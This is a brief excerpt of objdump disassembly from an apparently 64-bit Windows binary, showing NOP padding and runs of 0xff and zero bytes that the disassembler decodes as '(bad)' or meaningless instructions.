   140002c69:	90                   	nop
   140002c6a:	90                   	nop
   140002c6b:	90                   	nop
   140002c6c:	90                   	nop
   140002c6d:	90                   	nop
   140002c6e:	90                   	nop
   140002c6f:	90                   	nop
   140002c70:	ff                   	(bad)
   140002c71:	ff                   	(bad)
   140002c72:	ff                   	(bad)
   140002c73:	ff                   	(bad)
   140002c74:	ff                   	(bad)
   140002c75:	ff                   	(bad)
   140002c76:	ff                   	(bad)
   140002c77:	ff 60 2c             	jmp    *0x2c(%rax)
   140002c7a:	00 40 01             	add    %al,0x1(%rax)
	...
   140002c85:	00 00                	add    %al,(%rax)
   140002c87:	00 ff                	add    %bh,%bh
   140002c89:	ff                   	(bad)
   140002c8a:	ff                   	(bad)
   140002c8b:	ff                   	(bad)
   140002c8c:	ff                   	(bad)
   140002c8d:	ff                   	(bad)
   140002c8e:	ff                   	(bad)
   140002c8f:	ff 00                	incl   (%rax)
   140002c91:	00 00                	add    %al,(%rax)
   140002c93:	00 00                	add    %al,(%rax)
   140002c95:	00 00                	add    %al,(%rax)
	...
